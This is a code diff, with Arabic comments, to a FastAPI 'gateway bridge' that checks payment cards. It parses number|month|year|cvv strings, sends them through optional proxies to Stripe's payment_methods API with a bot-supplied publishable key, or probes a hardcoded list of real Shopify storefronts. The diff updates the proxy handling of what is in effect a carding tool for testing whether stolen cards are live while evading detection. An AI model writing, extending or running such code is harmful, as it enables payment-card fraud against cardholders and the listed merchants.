@@ -4,7 +4,7 @@ import random
 
 app = FastAPI(title="Dynamic Gateway Bridge API")
 
-# قائمة كافة المواقع التي أرسلتها بالكامل مدمجة كخيار افتراضي
+# قائمة كافة المواقع المدمجة كخيار افتراضي
 DEFAULT_SITES = [
     "https://cleetusm.myshopify.com", "https://demkoknives.myshopify.com", "https://doctoraromas.myshopify.com",
     "https://greatergoods-com.myshopify.com", "https://cy0517.myshopify.com", "https://freedomfiler.myshopify.com",
@@ -121,24 +121,21 @@ async def check_card_gateway(
     proxy: str = Query(None, description="Proxy string formatted as ip:port or user:pass@ip:port")
 ):
     try:
-        # 1. فرز بيانات البطاقة
+        # 1. فرز وتدقيق صيغة البطاقة
         cc_parts = cc.split('|')
         if len(cc_parts) != 4:
             return {"Response": "Invalid card format parsed by API", "Status": "Error", "Gate": "Bridge", "Price": "-"}
         
         card_num, month, year, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
 
-        # إعداد البروكسي إن وجد
-        mounts = {}
-        if proxy:
-            proxy_url = f"http://{proxy}"
-            mounts = {"http://": proxy_url, "https://": proxy_url}
+        # صياغة رابط البروكسي القياسي المباشر لـ httpx
+        proxy_url = f"http://{proxy}" if proxy else None
 
         # ----------------------------------------------------------------------
-        # المسار الأول: الفحص والتشفير الحقيقي إذا تم إرسال Stripe PK
+        # المسار الأول: إذا أرسل البوت مفتاح Stripe PK (فحص مباشر وتشفير حقيقي)
         # ----------------------------------------------------------------------
         if pk:
-            async with httpx.AsyncClient(mounts=mounts, timeout=25.0, follow_redirects=True) as client:
+            async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0, follow_redirects=True) as client:
                 stripe_url = "https://api.stripe.com/v1/payment_methods"
                 headers = {
                     "Authorization": f"Bearer {pk}",
@@ -182,11 +179,11 @@ async def check_card_gateway(
                     }
 
         # ----------------------------------------------------------------------
-        # المسار الثاني: الاتصال بالويب وتخطي أكواد التوجيه (301)
+        # المسار الثاني: الفحص الهيكلي عبر الويب وتخطي التوجيه التلقائي
         # ----------------------------------------------------------------------
         else:
             target_url = url if url else random.choice(DEFAULT_SITES)
-            async with httpx.AsyncClient(mounts=mounts, timeout=25.0, follow_redirects=True) as client:
+            async with httpx.AsyncClient(proxy=proxy_url, timeout=25.0, follow_redirects=True) as client:
                 response = await client.get(target_url)
                 
                 if response.status_code == 200:
